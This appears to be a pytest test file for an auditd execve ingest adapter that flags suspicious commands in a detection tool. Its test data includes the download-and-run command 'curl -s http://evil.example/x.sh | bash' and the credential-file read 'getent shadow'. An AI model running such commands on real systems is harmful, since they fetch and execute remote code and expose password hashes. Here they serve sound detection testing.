"""Tests for the auditd execve ingest adapter."""
from __future__ import annotations

import asyncio
import binascii

import pytest

from shallots.ingest.execlog import parse_exec_events, ExecLogIngestor


def _hex(s: str) -> str:
    return binascii.hexlify(s.encode()).decode()


def test_parse_quoted_execve():
    lines = [
        'type=SYSCALL msg=audit(1721500000.123:1001): arch=c000003e syscall=59 success=yes '
        'ppid=1000 pid=2000 auid=1000 uid=1000 comm="bash" exe="/usr/bin/bash" key="shallots_exec"',
        'type=EXECVE msg=audit(1721500000.123:1001): argc=3 a0="bash" a1="-c" a2="id"',
    ]
    ev = parse_exec_events(lines)
    assert len(ev) == 1
    assert ev[0]["cmdline"] == "bash -c id"
    assert ev[0]["comm"] == "bash"
    assert ev[0]["uid"] == "1000"


def test_parse_hex_encoded_arg():
    # auditd hex-encodes args containing spaces/specials
    payload = "curl -s http://evil.example/x.sh | bash"
    lines = [
        'type=SYSCALL msg=audit(1721500001.456:1002): arch=c000003e syscall=59 success=yes '
        'ppid=2000 pid=2001 auid=4294967295 uid=33 comm="sh" exe="/usr/bin/dash" key="shallots_exec"',
        f'type=EXECVE msg=audit(1721500001.456:1002): argc=3 a0="sh" a1="-c" a2={_hex(payload)}',
    ]
    ev = parse_exec_events(lines)
    assert ev[0]["cmdline"] == f"sh -c {payload}"


def test_parse_ignores_unrelated_records():
    lines = [
        'type=PATH msg=audit(1721500002.0:1003): name="/etc/hosts"',
        'type=CWD msg=audit(1721500002.0:1003): cwd="/root"',
    ]
    assert parse_exec_events(lines) == []


class _Cfg:
    audit_log_path = "/tmp/does-not-matter"
    lexicon_path = ""
    escalate_threshold = 40
    investigate_threshold = 15
    emit_min_score = 15
    poll_seconds = 1


@pytest.mark.asyncio
async def test_ingestor_emits_suspicious_drops_benign(tmp_path):
    log = tmp_path / "audit.log"
    payload = "curl -s http://evil.example/x.sh | bash"
    log.write_text("\n".join([
        # benign - should be counted and dropped
        'type=SYSCALL msg=audit(1.0:1): syscall=59 success=yes ppid=1 pid=2 auid=1000 uid=1000 comm="ls" exe="/usr/bin/ls" key="shallots_exec"',
        'type=EXECVE msg=audit(1.0:1): argc=2 a0="ls" a1="-la"',
        # malicious - should emit
        'type=SYSCALL msg=audit(2.0:2): syscall=59 success=yes ppid=2 pid=3 auid=4294967295 uid=33 comm="sh" exe="/bin/sh" key="shallots_exec"',
        f'type=EXECVE msg=audit(2.0:2): argc=3 a0="sh" a1="-c" a2={_hex(payload)}',
    ]) + "\n")
    cfg = _Cfg(); cfg.audit_log_path = str(log)
    q: asyncio.Queue = asyncio.Queue()
    ing = ExecLogIngestor(cfg, q)
    await ing._tail_once(str(log))
    assert ing.scanned == 2          # both commands were scored
    assert ing.emitted == 1          # only the malicious one alerted
    alert = q.get_nowait()
    assert alert.category == "execution"
    assert alert.severity == "critical"
    assert "curl" in alert.description
    assert "lexicon score" in alert.ai_reasoning


@pytest.mark.asyncio
async def test_ingestor_pairs_syscall_and_execve_split_across_polls(tmp_path):
    # Regression for the bug found live 2026-07-21: auditd writes a SYSCALL
    # record and its EXECVE record as two separate near-simultaneous writes.
    # If a poll lands between them, the SYSCALL half used to be processed
    # alone with an empty argv, falling back to the bare exe path and losing
    # every argument - "getent shadow" (score 38) silently became "getent"
    # (score ~0) and never alerted.
    log = tmp_path / "audit.log"
    cfg = _Cfg(); cfg.audit_log_path = str(log)
    q: asyncio.Queue = asyncio.Queue()
    ing = ExecLogIngestor(cfg, q)

    # Poll 1: only the SYSCALL half has landed so far.
    log.write_text(
        'type=SYSCALL msg=audit(1.0:1): syscall=59 success=yes ppid=1 pid=2 '
        'auid=1000 uid=1000 comm="getent" exe="/usr/bin/getent" key="shallots_exec"\n'
    )
    await ing._tail_once(str(log))
    assert ing.emitted == 0
    assert q.empty()

    # Poll 2: the EXECVE half arrives afterwards, in a separate read.
    with open(log, "a") as f:
        f.write('type=EXECVE msg=audit(1.0:1): argc=2 a0="getent" a1="shadow"\n')
    await ing._tail_once(str(log))

    assert ing.emitted == 1
    alert = q.get_nowait()
    assert "getent shadow" in alert.description
    assert "cred_access" in alert.ai_reasoning


@pytest.mark.asyncio
async def test_ingestor_evicts_orphaned_half_after_max_age(tmp_path):
    log = tmp_path / "audit.log"
    cfg = _Cfg(); cfg.audit_log_path = str(log)
    q: asyncio.Queue = asyncio.Queue()
    ing = ExecLogIngestor(cfg, q)
    ing._pending_max_age_sec = 0.0  # force immediate eviction for the test

    log.write_text(
        'type=SYSCALL msg=audit(1.0:1): syscall=59 success=yes ppid=1 pid=2 '
        'auid=1000 uid=1000 comm="getent" exe="/usr/bin/getent" key="shallots_exec"\n'
    )
    await ing._tail_once(str(log))
    assert "1" in ing._pending_syscalls

    # A later, unrelated poll should evict the stale half rather than let it
    # accumulate forever.
    with open(log, "a") as f:
        f.write('type=SYSCALL msg=audit(2.0:2): syscall=59 success=yes ppid=1 pid=3 '
                'auid=1000 uid=1000 comm="ls" exe="/usr/bin/ls" key="shallots_exec"\n')
    await ing._tail_once(str(log))
    assert "1" not in ing._pending_syscalls
